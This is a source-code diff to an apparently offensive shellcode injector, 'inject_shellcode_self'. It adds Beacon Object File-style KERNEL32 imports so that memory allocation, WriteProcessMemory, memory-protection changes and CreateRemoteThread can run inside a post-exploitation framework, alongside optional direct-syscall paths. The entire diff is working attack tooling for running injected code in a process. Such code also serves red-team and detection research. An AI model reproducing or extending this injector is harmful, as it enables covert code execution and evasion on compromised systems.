@@ -9,6 +9,59 @@
 
 #define NT_FAIL(status) (status < 0)
 
+#ifdef _BOF_
+#pragma clang diagnostic ignored "-Wdollar-in-identifier-extension"
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI void KERNEL32$Sleep(
+  DWORD dwMilliseconds
+);
+#define Sleep KERNEL32$Sleep
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI LPVOID KERNEL32$VirtualAllocEx(
+  HANDLE hProcess,
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flAllocationType,
+  DWORD  flProtect
+);
+#define VirtualAllocEx KERNEL32$VirtualAllocEx
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI BOOL KERNEL32$VirtualProtectEx(
+  HANDLE hProcess,
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flNewProtect,
+  PDWORD lpflOldProtect
+);
+#define VirtualProtectEx KERNEL32$VirtualProtectEx
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI BOOL KERNEL32$WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+#define WriteProcessMemory KERNEL32$WriteProcessMemory
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI HANDLE KERNEL32$CreateRemoteThread(
+  HANDLE                 hProcess,
+  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+  SIZE_T                 dwStackSize,
+  LPTHREAD_START_ROUTINE lpStartAddress,
+  LPVOID                 lpParameter,
+  DWORD                  dwCreationFlags,
+  LPDWORD                lpThreadId
+);
+#define CreateRemoteThread KERNEL32$CreateRemoteThread
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI WINAPI DWORD KERNEL32$WaitForSingleObject(
+  HANDLE hHandle,
+  DWORD  dwMilliseconds
+);
+#define WaitForSingleObject KERNEL32$WaitForSingleObject
+#endif
+
 void my_init_syscalls_list(void) {
     #ifdef SYSCALLS
     jm::init_syscalls_list();
@@ -29,10 +82,10 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
             #ifdef _DEBUG_
                 printf("ERROR: NtDelayExecution = 0x%x\n", status);
             #endif
-            return JOB_STATUS_ERROR;
+            return -1;
         }
     #else
-        sleep(sleep_time);
+        Sleep(sleep_time);
     #endif
 
     #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
@@ -62,7 +115,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
         #else
             allocation = VirtualAllocEx(
@@ -80,7 +133,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
         #endif
 
@@ -103,7 +156,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
         #else
             BOOL res = WriteProcessMemory(
@@ -117,7 +170,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: WriteProcessMemory = 0x%x\n", GetLastError());
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
         #endif
 
@@ -140,7 +193,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtProtectVirtualMemory = 0x%x\n", status);
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
             #else
             res = VirtualProtectEx(
@@ -154,7 +207,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: VirtualProtectEx = 0x%x\n", GetLastError());
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
             #endif
         #endif
@@ -203,7 +256,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: CreateRemoteThread = 0x%x\n", GetLastError());
                 #endif
-                return JOB_STATUS_ERROR;
+                return -1;
             }
         #endif
 
